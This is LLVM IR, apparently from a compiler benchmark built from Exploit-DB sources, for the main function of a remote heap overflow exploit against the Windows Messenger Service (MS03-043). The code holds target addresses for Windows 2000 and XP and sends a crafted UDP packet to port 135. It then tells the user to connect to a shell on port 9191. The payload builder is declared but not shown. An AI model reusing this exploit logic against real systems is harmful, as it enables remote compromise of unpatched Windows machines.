; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23247.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_23247.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.anon = type { [30 x i8], i32, i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.targetOS = private unnamed_addr constant [2 x %struct.anon] [%struct.anon { [30 x i8] c"Windows 2000 SP 3 (en)\00\00\00\00\00\00\00\00", i32 2012087372, i32 1988979006 }, %struct.anon { [30 x i8] c"Windows XP SP 1 (en)\00\00\00\00\00\00\00\00\00\00", i32 2012050356, i32 2013577042 }], align 16
@.str = private unnamed_addr constant [135 x i8] c"\0A-=[ MS Messenger Service Heap Overflow Exploit (MS03-043) ver %s ]=-\0A\0A by Adik < netmaniac [at] hotmail.KG >\0A http://netninja.to.kg\0A\0A\00", align 1
@VER = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [22 x i8] c" Target OS version:\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c" [%d]\09%s\0A\00", align 1
@.str.3 = private unnamed_addr constant [68 x i8] c"\0A Usage: %s [TargetIP] [ver: 0 | 1]\0A eg: msgr.exe 192.168.63.130 0\0A\00", align 1
@.str.4 = private unnamed_addr constant [63 x i8] c"[*] Target: \09 IP: %s\09 OS: %s\0A[*] UEF: \09 0x%x\0A[*] JMP: \09 0x%x\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"[*] WSAStartup initialized...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [40 x i8] c"[x] Socket not initialized! Exiting...\0A\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"[*] Socket initialized...\0A\00", align 1
@.str.8 = private unnamed_addr constant [47 x i8] c"[*] Injecting packet into a remote process...\0A\00", align 1
@.str.9 = private unnamed_addr constant [41 x i8] c"[x] Failed to inject packet! Exiting...\0A\00", align 1
@.str.10 = private unnamed_addr constant [24 x i8] c"[*] Packet injected...\0A\00", align 1
@.str.11 = private unnamed_addr constant [32 x i8] c"[i] Try connecting to %s:9191\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [8192 x i8], align 16
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca i32, align 4
  %14 = alloca [2 x %struct.anon], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = bitcast [2 x %struct.anon]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([2 x %struct.anon], [2 x %struct.anon]* @__const.main.targetOS, i32 0, i32 0, i32 0, i32 0), i64 80, i1 false)
  %16 = load i8*, i8** @VER, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str, i64 0, i64 0), i8* %16)
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 3
  br i1 %19, label %20, label %42

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %22

22:                                               ; preds = %34, %20
  %23 = load i32, i32* %8, align 4
  %24 = sext i32 %23 to i64
  %25 = icmp ult i64 %24, 2
  br i1 %25, label %26, label %37

26:                                               ; preds = %22
  %27 = load i32, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [2 x %struct.anon], [2 x %struct.anon]* %14, i64 0, i64 %29
  %31 = getelementptr inbounds %struct.anon, %struct.anon* %30, i32 0, i32 0
  %32 = getelementptr inbounds [30 x i8], [30 x i8]* %31, i64 0, i64 0
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i32 %27, i8* %32)
  br label %34

34:                                               ; preds = %26
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %22

37:                                               ; preds = %22
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.3, i64 0, i64 0), i8* %40)
  store i32 1, i32* %3, align 4
  br label %116

42:                                               ; preds = %2
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @atoi(i8* %45)
  store i32 %46, i32* %7, align 4
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 1
  %49 = load i8*, i8** %48, align 8
  %50 = load i32, i32* %7, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [2 x %struct.anon], [2 x %struct.anon]* %14, i64 0, i64 %51
  %53 = getelementptr inbounds %struct.anon, %struct.anon* %52, i32 0, i32 0
  %54 = getelementptr inbounds [30 x i8], [30 x i8]* %53, i64 0, i64 0
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [2 x %struct.anon], [2 x %struct.anon]* %14, i64 0, i64 %56
  %58 = getelementptr inbounds %struct.anon, %struct.anon* %57, i32 0, i32 1
  %59 = load i32, i32* %58, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [2 x %struct.anon], [2 x %struct.anon]* %14, i64 0, i64 %61
  %63 = getelementptr inbounds %struct.anon, %struct.anon* %62, i32 0, i32 2
  %64 = load i32, i32* %63, align 4
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.4, i64 0, i64 0), i8* %49, i8* %54, i32 %59, i32 %64)
  %66 = call i32 @WSAStartup(i32 514, i32* %13)
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  %68 = call i32 @ZeroMemory(%struct.sockaddr_in* %12, i32 12)
  %69 = load i32, i32* @AF_INET, align 4
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %69, i32* %70, align 4
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 1
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @inet_addr(i8* %73)
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %76 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %75, i32 0, i32 0
  store i32 %74, i32* %76, align 4
  %77 = call i32 @htons(i32 135)
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i32 %77, i32* %78, align 4
  %79 = getelementptr inbounds [8192 x i8], [8192 x i8]* %11, i64 0, i64 0
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [2 x %struct.anon], [2 x %struct.anon]* %14, i64 0, i64 %81
  %83 = getelementptr inbounds %struct.anon, %struct.anon* %82, i32 0, i32 2
  %84 = load i32, i32* %83, align 4
  %85 = load i32, i32* %7, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [2 x %struct.anon], [2 x %struct.anon]* %14, i64 0, i64 %86
  %88 = getelementptr inbounds %struct.anon, %struct.anon* %87, i32 0, i32 1
  %89 = load i32, i32* %88, align 8
  %90 = call i32 @PreparePacket(i8* %79, i32 8192, i32 %84, i32 %89)
  store i32 %90, i32* %9, align 4
  %91 = load i32, i32* @AF_INET, align 4
  %92 = load i32, i32* @SOCK_DGRAM, align 4
  %93 = load i32, i32* @IPPROTO_UDP, align 4
  %94 = call i32 @socket(i32 %91, i32 %92, i32 %93)
  store i32 %94, i32* %6, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %98

96:                                               ; preds = %42
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %116

98:                                               ; preds = %42
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0))
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.8, i64 0, i64 0))
  %101 = load i32, i32* %6, align 4
  %102 = getelementptr inbounds [8192 x i8], [8192 x i8]* %11, i64 0, i64 0
  %103 = load i32, i32* %9, align 4
  %104 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %105 = call i32 @sendto(i32 %101, i8* %102, i32 %103, i32 0, %struct.sockaddr* %104, i32 12)
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %107, label %109

107:                                              ; preds = %98
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.9, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %116

109:                                              ; preds = %98
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.10, i64 0, i64 0))
  br label %111

111:                                              ; preds = %109
  %112 = load i8**, i8*** %5, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 1
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.11, i64 0, i64 0), i8* %114)
  store i32 0, i32* %3, align 4
  br label %116

116:                                              ; preds = %111, %107, %96, %37
  %117 = load i32, i32* %3, align 4
  ret i32 %117
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @WSAStartup(i32, i32*) #2

declare dso_local i32 @ZeroMemory(%struct.sockaddr_in*, i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @PreparePacket(i8*, i32, i32, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
